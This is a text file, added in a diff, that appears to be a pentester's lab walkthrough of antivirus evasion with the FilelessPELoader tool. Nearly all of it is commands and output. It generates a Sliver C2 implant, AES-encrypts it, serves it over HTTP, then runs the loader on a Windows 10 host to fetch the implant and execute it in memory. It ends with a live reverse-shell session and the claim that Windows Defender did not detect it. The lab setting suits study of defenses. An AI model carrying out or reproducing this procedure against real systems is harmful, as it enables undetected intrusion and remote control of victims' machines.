@@ -1,0 +1,193 @@
+====================================================================================================================================================
+AV bypass using the tool 'FilelessPELoader'  
+====================================================================================================================================================
+
+The tool "FilelessPELoader" allows to load and execute directly into memory an encrypted remote Portable Executable (PE).
+
+=> Source: https://github.com/TheD1rkMtr/FilelessPELoader
+
+Notes regarding AV detection
+-----------------------------
+This loader works well with hacking tools that are not heavily signed by antivirus solutions. 
+For instance, when I tried to load the tool "Mimikitaz.exe" and a meterpeeter shell they were both detected and blocked by Windows Defender.
+
+
+====================================================================================================================================================
+PoC 1 - Download & execute (in-memory) an encrypted SLiver C2 implant on a Windows 10 laptop without being detected nor blocked by Windows Defender
+====================================================================================================================================================
+
+----------------------------------------------------------------------------------------------------------------------------------------------------
+Step 1 - Download and compile the tool 'FilelessPELoader'
+----------------------------------------------------------------------------------------------------------------------------------------------------
+
+C:\Users\jfc\Documents\Tools-Pentest\1-Antivirus-bypass\FilelessPELoader-main>dir
+ Volume in drive C is Windows
+ Volume Serial Number is F06E-DC58
+
+ Directory of C:\Users\jfc\Documents\Tools-Pentest\1-Antivirus-bypass\FilelessPELoader-main
+
+02/11/2023  06:34 PM    <DIR>          .
+02/11/2023  06:34 PM    <DIR>          ..
+02/11/2023  06:34 PM               967 aes.py
+03/19/2023  09:20 PM    <DIR>          FilelessPELoader
+02/11/2023  06:34 PM         1,250,056 mimikatz.exe
+02/11/2023  06:34 PM               565 README.md
+               3 File(s)      1,251,588 bytes
+               3 Dir(s)  248,797,466,624 bytes free
+
+
+C:\Users\jfc\Documents\Tools-Pentest\1-Antivirus-bypass\FilelessPELoader-main\FilelessPELoader\x64\Release>dir
+ Volume in drive C is Windows
+ Volume Serial Number is F06E-DC58
+
+ Directory of C:\Users\jfc\Documents\Tools-Pentest\1-Antivirus-bypass\FilelessPELoader-main\FilelessPELoader\x64\Release
+
+03/19/2023  11:21 PM    <DIR>          .
+03/19/2023  11:21 PM    <DIR>          ..
+03/19/2023  09:20 PM            20,992 FilelessPELoader.exe
+03/19/2023  09:20 PM               373 FilelessPELoader.exe.recipe
+03/19/2023  09:20 PM           183,194 FilelessPELoader.iobj
+03/19/2023  09:20 PM            86,544 FilelessPELoader.ipdb
+03/19/2023  09:20 PM             2,197 FilelessPELoader.log
+03/19/2023  09:20 PM           385,500 FilelessPELoader.obj
+03/19/2023  09:20 PM           667,648 FilelessPELoader.pdb
+03/19/2023  09:20 PM    <DIR>          FilelessPELoader.tlog
+03/19/2023  09:20 PM               132 FilelessPELoader.vcxproj.FileListAbsolute.txt
+03/19/2023  09:20 PM           208,896 vc142.pdb
+               9 File(s)      1,555,476 bytes
+               3 Dir(s)  248,799,092,736 bytes free
+
+
+----------------------------------------------------------------------------------------------------------------------------------------------------
+Step 2 - Generate a SLIVER https reverse shell and encrypt it with the python script 'aes.py'
+----------------------------------------------------------------------------------------------------------------------------------------------------
+
+jeff@kali:~/Documents/Tools/SLiver-C2$ sudo sliver-server
+[*] Loaded 17 aliases from disk
+[*] Loaded 16 extension(s) from disk
+
+.------..------..------..------..------..------.
+|S.--. ||L.--. ||I.--. ||V.--. ||E.--. ||R.--. |
+| :/\: || :/\: || (\/) || :(): || (\/) || :(): |
+| :\/: || (__) || :\/: || ()() || :\/: || ()() |
+| '--'S|| '--'L|| '--'I|| '--'V|| '--'E|| '--'R|
+`------'`------'`------'`------'`------'`------'
+
+All hackers gain reinforce
+[*] Server v1.5.31 - kali
+[*] Welcome to the sliver shell, please type 'help' for options
+
+[*] Check for updates with the 'update' command
+
+[server] sliver > generate --arch amd64 -f exe --http 192.168.1.30 --save /home/jeff/Documents/Tools/SLiver-C2/SliverShell.exe --os Windows
+
+[*] Generating new windows/amd64 implant binary
+[*] Symbol obfuscation is enabled
+[*] Build completed in 1m5s
+[*] Implant saved to /home/jeff/Documents/Tools/SLiver-C2/SliverShell.exe
+
+
+jeff@kali:~/Documents/Tools/FilelessPELoader-main$ sudo chmod 764 /home/jeff/Documents/Tools/SLiver-C2/SliverShell.exe
+
+jeff@kali:~/Documents/Tools/FilelessPELoader-main$ cp /home/jeff/Documents/Tools/SLiver-C2/SliverShell.exe ./
+
+jeff@kali:~/Documents/Tools/FilelessPELoader-main$ ls
+aes.py  cipher.bin  FilelessPELoader  key.bin  mimikatz.exe  README.md  shell.exe  SliverShell.exe
+
+jeff@kali:~/Documents/Tools/FilelessPELoader-main$ sudo python3 aes.py SliverShell.exe 
+
+jeff@kali:~/Documents/Tools/FilelessPELoader-main$ ls -al
+total 38368
+drwxr-xr-x  3 jeff jeff     4096 Mar 19 23:31 .
+drwxr-xr-x 61 jeff jeff     4096 Mar 19 22:48 ..
+-rwxr-xr-x  1 jeff jeff      967 Mar 19 22:53 aes.py
+-rw-r--r--  1 root root 18570768 Mar 19 23:31 cipher.bin
+drwxr-xr-x  2 jeff jeff     4096 Feb 11 18:34 FilelessPELoader
+-rw-r--r--  1 root root       16 Mar 19 23:31 key.bin
+-rw-r--r--  1 jeff jeff  1250056 Feb 11 18:34 mimikatz.exe
+-rw-r--r--  1 jeff jeff      565 Feb 11 18:34 README.md
+-rw-r--r--  1 jeff jeff   207872 Mar 19 23:21 shell.exe
+-rwxr--r--  1 jeff jeff 18570752 Mar 19 23:31 SliverShell.exe
+
+jeff@kali:~/Documents/Tools/FilelessPELoader-main$ python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+
+
+----------------------------------------------------------------------------------------------------------------------------------------------
+Step 3 - Download & execute (in-memory) the encrypted SLiver C2 implant using the tool 'FilelessPELoader'
+----------------------------------------------------------------------------------------------------------------------------------------------
+
+C:\Temp>powershell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Try the new cross-platform PowerShell https://aka.ms/pscore6
+
+PS C:\Temp> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,AntivirusSignatureLastUpdated | FL
+
+AntivirusEnabled              : True
+RealTimeProtectionEnabled     : True
+IoavProtectionEnabled         : True
+AntispywareEnabled            : True
+AntivirusSignatureLastUpdated : 3/19/2023 10:28:59 AM
+
+
+PS C:\Users\Administrator> cmd
+Microsoft Windows [Version 10.0.14393]
+(c) Microsoft Corporation. All rights reserved.
+
+c:\Users\Administrator> cd C:\temp
+c:\temp>
+
+C:\Temp>.\FilelessPELoader.exe 192.168.1.30 8080 cipher.bin key.bin
+
+[+] Get AES Encrypted PE from 192.168.1.30:8080
+
+[+] Get AES Key from 192.168.1.30:8080
+
+[+] AES PE Address : 0000020BE07D7040
+
+[+] AES Key Address : 0000020BDE728720
+
+[+] Decrypt the PE
+
+[+] PE Decrypted
+
+[+] Loading and Running PE
+
+
+----------------------------------------------------------------------------------------------------------------------------------------------
+Step 4 - Enjoy the SLIVER reverse shell running on the target Windows 10 laptop without being detected nor blocked by the MS Defender AV
+----------------------------------------------------------------------------------------------------------------------------------------------
+
+[server] sliver > https --lhost 192.168.1.30 --lport 443
+
+[*] Starting HTTPS :443 listener ...
+
+[*] Successfully started job #1
+
+[*] Session f7e6fcb7 ROUND_CRIMINAL - 192.168.1.144:58771 (PO744653) - windows/amd64 - Sun, 19 Mar 2023 23:32:49 CET
+
+[server] sliver > sessions
+
+ ID         Transport   Remote Address        Hostname   Username     Operating System   Health  
+========== =========== ===================== ========== ============ ================== =========
+ f7e6fcb7   http(s)     192.168.1.144:58771   PO744653   LAB\jfc   windows/amd64      [ALIVE] 
+
+[server] sliver > sessions f7e6fcb7
+error: invalid usage of command 'sessions' (unconsumed input 'f7e6fcb7'), try 'help'
+[server] sliver > sessions -i f7e6fcb7
+
+[*] Active session ROUND_CRIMINAL (f7e6fcb7)
+
+[server] sliver (ROUND_CRIMINAL) > getuid
+
+S-1-5-21-666114207-261065646-224150901-1121
+
+[server] sliver (ROUND_CRIMINAL) > whoami
+
+Logon ID: LAB\jfc
+[*] Current Token ID: LAB\jfc
+[server] sliver (ROUND_CRIMINAL) >  
+
+<SNIP>
